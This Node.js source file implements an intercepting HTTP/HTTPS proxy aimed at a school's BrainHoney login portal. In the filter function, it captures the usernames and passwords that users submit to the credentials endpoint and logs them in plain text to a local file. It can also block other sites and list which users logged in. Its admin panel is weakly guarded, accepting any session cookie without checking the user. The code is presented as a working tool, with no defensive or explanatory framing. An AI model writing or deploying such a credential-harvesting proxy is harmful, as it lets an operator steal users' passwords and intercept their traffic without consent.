var http = require('http'),
    https = require('https'),
    fs = require('fs'),
    handler = require(__dirname + '/lib.js'),
    upgrade = require(__dirname + '/upgrade.js'),
    logger = require(__dirname + '/log.js');

var shouldBlock = false, activatedUsers = [];
var admin_server = function(req, res, parsed_req) {
  var cookie = {};
  (req.headers['cookie'] || '').split(';').forEach(function(pair) {
    pair = pair.split('=');
    cookie[pair[0]] = pair[1];
  });
  if( cookie['.ASPXAUTH'] ) {
    // TODO: check username
    switch( parsed_req.path ) {
      case '/proxy_admin/enforce':
        shouldBlock = true; 
	res.write("Enforcing");
	res.end();
      break;
      case '/proxy_admin/disable':
        shouldBlock = false;
	activatedUsers = [];
	res.write("Disabled");
	res.end();
      break;
      default:
        res.write("Admin\n" + activatedUsers.join('\n'));
	res.end();
      break;
    }
    res.write("Admin\n");
    res.end();
  } else {
    res.writeHead(302, {
      'Location': 'https://bwhs.brainhoney.com/Login.vp/page.htm?ReturnUrl=https%3A%2F%2Fbwhs.brainhoney.com%2Fproxy_admin'
    });
    res.end();
  }
};
var filter = function(req, res, parsed_req, cont) {
  if( parsed_req.host == 'bwhs.brainhoney.com' || !shouldBlock ) {
    if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
      logger(req, './log.txt', function(body) {
	shouldBlock && activatedUsers.push(body.username);
	return body.username+'    '+body.password;
      });
    } else if( parsed_req.path.match(/^\/proxy_admin/) ) {
      admin_server(req, res, parsed_req);
    }
    cont();
  } else {
    res.write("Permission Denied");
    res.end();
  }
};

https.createServer({
  key: fs.readFileSync('certs/key.pem'),
  cert: fs.readFileSync('certs/cert.pem')
}, handler(https, filter, function(req) {
  req.url = 'https://' + req.headers['host'] + req.url;
  return req;
})).listen(8081);

http.createServer(handler(http, filter)).on('upgrade', function(req, socket, head) {
  upgrade(socket, 'localhost', 8081);
}).listen(8080);

